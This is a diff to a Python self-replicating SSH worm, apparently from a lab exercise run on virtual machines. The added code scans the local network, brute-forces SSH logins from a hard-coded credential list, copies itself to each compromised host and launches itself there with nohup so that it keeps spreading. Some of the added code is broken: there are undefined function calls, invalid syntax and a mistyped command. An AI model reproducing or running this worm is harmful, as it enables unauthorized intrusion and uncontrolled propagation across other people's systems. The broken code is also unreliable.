@@ -4,6 +4,17 @@ import nmap
 import os
 import os.path
 
+markerLocation = "/tmp/marker.txt"
+wormMessageLocation = "/tmp/wormMessage.txt"
+
+wordList = [
+('awesomeUserName', 'badPassword'),
+('awesomeHacker101', 'password'),
+('ubuntu', '123456'),		#VM1
+('best_username', 'awesomePassword'),
+('ubuntu', 'password'),		#VM2
+('ubuntu', 'password1') ]	#VM3
+
 def getHostsOnTheSameNetwork():
 	
 	# Create an instance of the port scanner class
@@ -32,73 +43,89 @@ def getHostsOnTheSameNetwork():
 		
 	return liveHosts
 
-# Open the file and write something to it.
-# We will use this as evidence that the worm
-# has executed on the remote system
 
-try:
-	marker = open("/tmp/marker.txt", "r")
-	print ("This has been marked!")
-except:
+# Find if the target has already been infected with our worm
+def isTargetInfected():
+	if os.path.exists(markerLocation):
+		return True
+	else:
+		return False
 
-	fileObj = open("/tmp/joseph_porter.txt", "w")
 
-	# Write something to the file
+def infectSystem():
+	fileObj = open(wormMessageLocation, "w")
 	fileObj.write("Dont forget to place witty remark here...")
-
-	# Close the file
 	fileObj.close()
 
-	markerObj = open("/tmp/marker.txt", "w")
-	markerObj.write("This is marked")
-	markerObj.close()
-	print ("Marking this victim now")
+
+def markSystem():
+	marker = open(markerLocation, "w")
+	marker.write("This is marked!!!!")
+	marker.close()
 
 
+def attackHost(host):
 
-for potential in getHostsOnTheSameNetwork():
+	global wordList
 
-	try:
+	# Create an instance of the SSH client
+	ssh = paramiko.SSHClient()
 
-		# Create an instance of the SSH client
-		ssh = paramiko.SSHClient()
+	# Set some parameters to make things easier.
+	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-		# Set some parameters to make things easier.
-		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	for (_username, _password) in wordList:
+		
+		try:
+			ssh.connect(host, username=_username, password=_password)
+			return (ssh, _username, _password)
+		except:
 
-		# Connect to the remote system.
-		ssh.connect(potential, username="ubuntu",password="123456")
-		# Create an instance of the SFTP class; used
-		# for uploading/downloading files and executing
-		# commands.
-		sftpClient = ssh.open_sftp()
-
-
-		# Copy your self to the remote system (i.e. the other VM). We are assuming the
-		# password has already been cracked. The worm is placed in the /tmp
-		# directory on the remote system.
-		sftpClient.put("replicating_worm.py", "/tmp/" + "replicating_worm.py")
-
-		# Make the worm file exeutable on the remote system
-		ssh.exec_command("chmod a+x /tmp/replicating_worm.py")
-
-		# Execute the worm!
-		# nohup - keep the worm running after we disconnect.
-		# python - the python interpreter
-		# /tmp/worm.py - the worm script
-		# & - run the whole commnad in the background
-		ssh.exec_command("nohup python /tmp/replicating_worm.py &")
-	except:
-		print "This ip is not working: %s" %(str(potential))
+	return None
 
 
-def main(args):
+def startAttacking(wormLocation, isHost):
+
+	network = getHostsOnTheSameNetwork()
+
+	if isHost:
+		print network
+
+	for Host in network:
+		
+		sshInfo = attackHost(Host)
+
+		if isHost:
+			print("SSH Info: %s" %(str(sshInfo)))
+		
+		if sshInfo:
+
+			sftpClient = sshInfo[0].open_sftp()
+			sftpClient.put(wormLocation, "/tmp/" + "replicating_worm.py")
+			sshInfo[0].exec_command("chmod a+x /tmp/replicating_worm.py")
+			sshInfo[0].exec_command("nohub python /tmp/replicating_worm.py &")
+
+		elif isHost:
+			print("Could not spread to this host: %s" + %(str(Host)))
+	
+	
+def main(argv):
+
+	if len(argv) == 2:
+		if argv[1] == "-h":
+			print("Usage: python replicating_worm.py [-host | -h]\n-host this si the host system don't attack!\n-h Shows help screen\nDefault will attack host and spread")
+		elif argv[1] == "-host":
+			markSystem()
+			attackSystem("replicating_worm.py", True)
+	else:
+		if !isTargetInfected():
+			attackSystem("/tmp/replicating_worm.py", False)
 	
 
 
 
 if __name__ == "__main__":
-	main(sys.args)
+	main(sys.argv)
 
 
 
